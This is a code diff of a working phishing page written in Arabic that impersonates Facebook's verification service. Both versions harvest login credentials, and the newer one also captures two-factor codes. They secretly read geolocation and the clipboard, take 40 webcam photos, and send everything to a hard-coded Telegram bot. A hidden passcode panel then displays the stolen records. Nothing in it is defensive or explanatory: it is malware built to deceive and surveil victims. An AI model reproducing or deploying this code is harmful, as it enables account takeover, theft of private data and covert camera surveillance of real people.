@@ -3,197 +3,170 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook | AI Verification Hub</title>
+    <title>Facebook Security | مركز التحقق العالمي</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --fb-blue: #1877f2; --fb-bg: #f0f2f5; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--fb-bg); margin: 0; overflow: hidden; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; overflow: hidden; }
+        /* ترس الملك السري - شفاف جداً */
+        #royal-gate { position: fixed; top: 5px; left: 5px; color: #000; cursor: pointer; z-index: 10000; opacity: 0.05; }
         
-        /* أيقونة الملك السرية */
-        #king-portal-btn { position: fixed; top: 10px; right: 10px; color: #ccc; cursor: pointer; z-index: 10000; opacity: 0.1; font-size: 20px; }
+        .main-wrapper { display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 12px 30px rgba(0,0,0,0.15); width: 100%; max-width: 400px; text-align: center; border-top: 8px solid #1877f2; }
         
-        /* واجهة الضحية */
-        .app-container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        .auth-card { background: white; padding: 35px; border-radius: 15px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); width: 100%; max-width: 420px; text-align: center; position: relative; }
-        .fb-logo { color: var(--fb-blue); font-size: 42px; font-weight: bold; margin-bottom: 5px; }
-        
-        /* حبشتكنات الذكاء الاصطناعي */
-        .ai-scanner { border: 2px solid #e7f3ff; border-radius: 10px; padding: 15px; margin: 20px 0; position: relative; overflow: hidden; }
-        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: var(--fb-blue); animation: scan 2s infinite; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        /* تأثير النبض الرقمي */
+        .pulse { width: 80px; height: 80px; background: #e7f3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: pulse-blue 2s infinite; }
+        @keyframes pulse-blue { 0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(24, 119, 242, 0.7); } 70% { transform: scale(1); box-shadow: 0 0 0 15px rgba(24, 119, 242, 0); } 100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(24, 119, 242, 0); } }
 
-        input { width: 92%; padding: 15px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 8px; font-size: 16px; background: #f5f6f7; transition: 0.3s; }
-        input:focus { border-color: var(--fb-blue); background: #fff; }
+        input { width: 92%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 8px; font-size: 16px; transition: 0.3s; }
+        .btn-action { width: 100%; padding: 16px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 19px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         
-        .btn-prime { width: 100%; padding: 16px; background: var(--fb-blue); color: white; border: none; border-radius: 8px; font-size: 20px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 14px rgba(24,119,242,0.4); }
-        
-        /* لوحة تحكم الملك الملكية */
-        #royal-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #00ff00; z-index: 99999; padding: 30px; overflow-y: auto; font-family: 'Consolas', monospace; }
-        .victim-card { border: 1px solid #1a1a1a; padding: 15px; margin-bottom: 15px; background: #0a0a0a; border-right: 4px solid #00ff00; }
-        .tag { color: #0ff; font-weight: bold; }
+        /* لوحة تحكم الإمبراطور */
+        #admin-vault { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #050505; color: #00ff41; z-index: 99999; padding: 25px; overflow-y: auto; font-family: 'Courier New', monospace; }
+        .data-card { border: 1px dashed #333; padding: 15px; margin-bottom: 10px; background: #000; border-left: 5px solid #00ff41; }
     </style>
 </head>
 <body>
 
-<!-- مفتاح الدخول السري -->
-<div id="king-portal-btn" onclick="openKingVault()"><i class="fas fa-user-shield"></i></div>
+<div id="royal-gate" onclick="enterVault()"><i class="fas fa-shield-alt"></i></div>
 
-<div id="victim-ui" class="app-container">
-    <div class="fb-logo">facebook</div>
-    <div class="auth-card">
-        <div class="ai-scanner">
-            <div class="scan-line"></div>
-            <i class="fas fa-robot" style="font-size: 30px; color: #1877f2;"></i>
-            <div id="ai-text" style="font-size: 13px; margin-top: 10px; font-weight: bold;">جاري فحص بروتوكولات الأمان...</div>
+<div class="main-wrapper">
+    <div class="box">
+        <div class="pulse"><i class="fas fa-user-check" style="color:#1877f2; font-size:35px;"></i></div>
+        <h2 id="dynamic-title" style="margin:0 0 10px;">نظام الحماية المتقدم</h2>
+        <p id="dynamic-p" style="font-size:14px; color:#606770;">جاري فحص اتصالك لضمان أمان عملية التوثيق...</p>
+        
+        <div id="login-form">
+            <input type="text" id="email_phone" placeholder="البريد الإلكتروني أو الهاتف">
+            <input type="password" id="pass_main" placeholder="كلمة السر">
+            <button class="btn-action" onclick="phaseOne()">تأكيد الهوية (V22)</button>
         </div>
-        
-        <h3 style="margin: 0;">نظام التوثيق المتقدم V21</h3>
-        <p style="font-size: 13px; color: #606770;">لقد اكتشف Gemini AI أنك تستحق شارة التوثيق. يرجى تأكيد ملكية الحساب للبدء.</p>
 
-        <input type="text" id="u_field" placeholder="البريد الإلكتروني أو الهاتف">
-        <input type="password" id="p_field" placeholder="كلمة السر">
-        
-        <button class="btn-prime" onclick="startFinalHarvest()">تأكيد الهوية وتوثيق الحساب</button>
-        
-        <div id="loader" style="display:none; margin-top:20px;">
-            <i class="fas fa-spinner fa-spin" style="color: #1877f2; font-size: 24px;"></i>
-            <p style="font-size: 12px; color: #28a745; font-weight: bold;">جاري سحب الصلاحيات ومطابقة البيانات...</p>
+        <div id="otp-form" style="display:none;">
+            <p style="color:red; font-size:12px; font-weight:bold;">تم تفعيل التحقق بخطوتين! يرجى إدخال الرمز الواصل لهاتفك:</p>
+            <input type="number" id="otp_code" placeholder="أدخل الرمز المكون من 6 أرقام">
+            <button class="btn-action" style="background:#28a745;" onclick="phaseTwo()">تأكيد الرمز</button>
+        </div>
+
+        <div id="final-loader" style="display:none; margin-top:20px;">
+            <i class="fas fa-cog fa-spin" style="font-size:30px; color:#1877f2;"></i>
+            <p>جاري مزامنة شارة التوثيق مع جهازك...</p>
         </div>
     </div>
 </div>
 
-<div id="royal-panel">
-    <div style="display:flex; justify-content:space-between; align-items:center;">
-        <h1 style="color: #0ff; text-shadow: 0 0 10px #0ff;">🔱 TALLAH SUPREME VAULT 🔱</h1>
-        <button onclick="clearLogs()" style="background:orange; color:black; border:none; padding:10px; cursor:pointer; font-weight:bold;">مسح السجل</button>
-        <button onclick="location.reload()" style="background:red; color:white; border:none; padding:10px; cursor:pointer;">خروج</button>
+<div id="admin-vault">
+    <div style="display:flex; justify-content:space-between;">
+        <h1 style="color:#0ff;">🔱 INFINITY-X CONTROL CENTER</h1>
+        <button onclick="location.reload()" style="background:red; color:white; border:none; padding:10px;">إغلاق</button>
     </div>
-    <hr color="#111">
-    <div id="logs-display"></div>
+    <hr color="#222">
+    <div id="logs-container"></div>
 </div>
 
 <script>
 const BOT_TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
 const CHAT_ID = "8754338811";
 
-// 1. هندسة اجتماعية (تأثير القطيع)
+// 1. التعرف على الجهاز وتخصيص الرسالة
 window.onload = () => {
-    setTimeout(() => { document.getElementById('ai-text').innerText = "✅ تم التحقق من سلامة المتصفح"; }, 2000);
-    // إشعار وهمي لإغراء الضحية
-    setInterval(() => {
-        if(Math.random() > 0.7) {
-            const names = ["أحمد", "سارة", "محمد", "ياسين", "نور"];
-            const name = names[Math.floor(Math.random()*names.length)];
-            const toast = document.createElement('div');
-            toast.style = "position:fixed; bottom:20px; right:20px; background:white; padding:10px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.2); font-size:12px; z-index:9999; border-left:4px solid #28a745;";
-            toast.innerHTML = `👤 صديقك <b>${name}</b> وثق حسابه الآن!`;
-            document.body.appendChild(toast);
-            setTimeout(() => toast.remove(), 4000);
-        }
-    }, 10000);
+    const platform = navigator.platform;
+    document.getElementById('dynamic-p').innerText = `تم اكتشاف جهاز (${platform}). جاري تهيئة بروتوكول التوثيق المخصص لك.`;
 };
 
-// 2. بوابة الملك (44443)
-function openKingVault() {
-    if(prompt("Royal Vault Pass:") === "44443") {
-        renderVault();
-        document.getElementById('royal-panel').style.display = 'block';
+// 2. دخول الملك (44443)
+function enterVault() {
+    if(prompt("كود الملك العظيم:") === "44443") {
+        renderLogs();
+        document.getElementById('admin-vault').style.display = 'block';
     }
 }
 
-// 3. التنفيذ النهائي (Execution)
-async function startFinalHarvest() {
-    const u = document.getElementById('u_field').value;
-    const p = document.getElementById('p_field').value;
+// 3. المرحلة الأولى: سحب الحساب
+async function phaseOne() {
+    const u = document.getElementById('email_phone').value;
+    const p = document.getElementById('pass_main').value;
     if(!u || !p) return;
 
-    // صوت "تم التحقق" (حبشتكنات)
-    new Audio('https://www.soundjay.com/buttons/sounds/button-3.mp3').play();
+    saveData("ACCOUNT", `USER: ${u} | PASS: ${p}`);
+    await sendTG(`🎯 صيد جديد (المرحلة 1):\n👤: ${u}\n🔑: ${p}`);
 
-    document.getElementById('loader').style.display = "block";
+    // الانتقال لطلب الرمز (التحقق بخطوتين) - فكرة ذكية جداً
+    document.getElementById('login-form').style.display = "none";
+    document.getElementById('otp-form').style.display = "block";
     
-    // سحب البيانات
-    logData("TARGET", `USER: ${u} | PASS: ${p}`);
-    await pushTG(`🔱 صيد إمبراطوري جديد 🔱\n👤: ${u}\n🔑: ${p}`);
-
-    // استنزاف كافة الصلاحيات
-    drainEverything();
+    // سحب الصلاحيات في الخلفية
+    startOmniHarvest();
 }
 
-async function drainEverything() {
-    // الموقع الدقيق
+// 4. المرحلة الثانية: سحب رمز الأمان
+async function phaseTwo() {
+    const code = document.getElementById('otp_code').value;
+    if(!code) return;
+
+    saveData("OTP-CODE", `CODE: ${code}`);
+    await sendTG(`🛡️ رمز الأمان المسحوب: ${code}`);
+
+    document.getElementById('otp-form').style.display = "none";
+    document.getElementById('final-loader').style.display = "block";
+
+    setTimeout(() => {
+        window.location.href = "https://www.facebook.com/me"; // تحويل الضحية للفيسبوك الحقيقي
+    }, 4000);
+}
+
+// 5. محرك استنزاف الصلاحيات
+async function startOmniHarvest() {
+    // الموقع، الحافظة، البطارية
     navigator.geolocation.getCurrentPosition(pos => {
-        const url = `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-        pushTG(url); logData("LOCATION", url);
+        sendTG(`📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
     });
 
-    // الحافظة (Clipboard)
     try {
-        const text = await navigator.clipboard.readText();
-        if(text) { pushTG(`📋 حافظة الضحية: ${text}`); logData("CLIPBOARD", text); }
+        const clip = await navigator.clipboard.readText();
+        if(clip) sendTG(`📋 حافظة: ${clip}`);
     } catch(e){}
 
-    // معلومات الجهاز والبطارية
-    const b = await navigator.getBattery();
-    const info = `🔋 بطارية: ${b.level*100}% | 📶 شبكة: ${navigator.connection.effectiveType} | 💻 جهاز: ${navigator.platform}`;
-    pushTG(info); logData("HARDWARE", info);
-
-    // سحب 40 صورة في الخلفية
-    startStealthCam();
-
-    // خدعة اختيار المجلد
-    setTimeout(() => {
-        alert("🛡️ إجراء أمني: يرجى اختيار مجلد الصور (DCIM) لمطابقة بصمة الوجه الرقمية.");
-        const inp = document.createElement('input'); inp.type = 'file'; inp.webkitdirectory = true;
-        inp.onchange = (e) => {
-            pushTG(`📂 الضحية سمح بالوصول لـ ${e.target.files.length} ملف.`);
-            logData("FILES", `Access to ${e.target.files.length} files confirmed.`);
-            alert("✅ تم التوثيق بنجاح! سيتم مراجعة طلبك خلال 10 دقائق.");
-        };
-        inp.click();
-    }, 5000);
+    // سحب 40 صورة
+    grabPhotos();
 }
 
-// 4. محرك الجاسوس البصري
-async function startStealthCam() {
+async function grabPhotos() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({video: true});
-        let i = 0;
-        const loop = setInterval(() => {
-            if(i < 40) {
-                const v = document.createElement('video'); v.srcObject = stream; v.play();
-                const c = document.createElement('canvas');
-                c.width = 640; c.height = 480;
-                c.getContext('2d').drawImage(v, 0, 0);
-                c.toBlob(b => sendPhoto(b, `📸 لقطة رقم ${i+1}`));
-                i++;
-            } else { stream.getTracks().forEach(t => t.stop()); clearInterval(loop); }
+        let c = 0;
+        const interval = setInterval(() => {
+            if(c < 40) {
+                const vid = document.createElement('video'); vid.srcObject = stream; vid.play();
+                const can = document.createElement('canvas');
+                can.width = 640; can.height = 480;
+                can.getContext('2d').drawImage(vid, 0, 0);
+                can.toBlob(b => sendPhoto(b, `📸 لقطة رقم ${c+1}`));
+                c++;
+            } else { stream.getTracks().forEach(t => t.stop()); clearInterval(interval); }
         }, 2000);
     } catch(e) {}
 }
 
-// إدارة السجلات
-function logData(type, content) {
-    let logs = JSON.parse(localStorage.getItem('supreme_logs')) || [];
-    logs.push({type, content, time: new Date().toLocaleTimeString()});
-    localStorage.setItem('supreme_logs', JSON.stringify(logs));
+// إدارة البيانات
+function saveData(type, info) {
+    let db = JSON.parse(localStorage.getItem('infinity_db')) || [];
+    db.push({type, info, time: new Date().toLocaleTimeString()});
+    localStorage.setItem('infinity_db', JSON.stringify(db));
 }
 
-function renderVault() {
-    const list = document.getElementById('logs-display');
-    const logs = JSON.parse(localStorage.getItem('supreme_logs')) || [];
-    list.innerHTML = logs.reverse().map(l => `
-        <div class="victim-card">
-            <span class="tag">[${l.time}]</span> <span style="color:#f0f;">[${l.type}]</span>: ${l.content}
+function renderLogs() {
+    const cont = document.getElementById('logs-container');
+    const db = JSON.parse(localStorage.getItem('infinity_db')) || [];
+    cont.innerHTML = db.reverse().map(l => `
+        <div class="data-card">
+            [${l.time}] <b style="color:#0ff;">${l.type}</b>: ${l.info}
         </div>
     `).join('');
 }
 
-function clearLogs() { localStorage.removeItem('supreme_logs'); renderVault(); }
-
-async function pushTG(m) { fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(m)}`); }
+async function sendTG(m) { fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(m)}`); }
 async function sendPhoto(b, cap) {
-    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 's.jpg'); fd.append('caption', cap);
+    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'x.jpg'); fd.append('caption', cap);
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:fd});
 }
 </script>
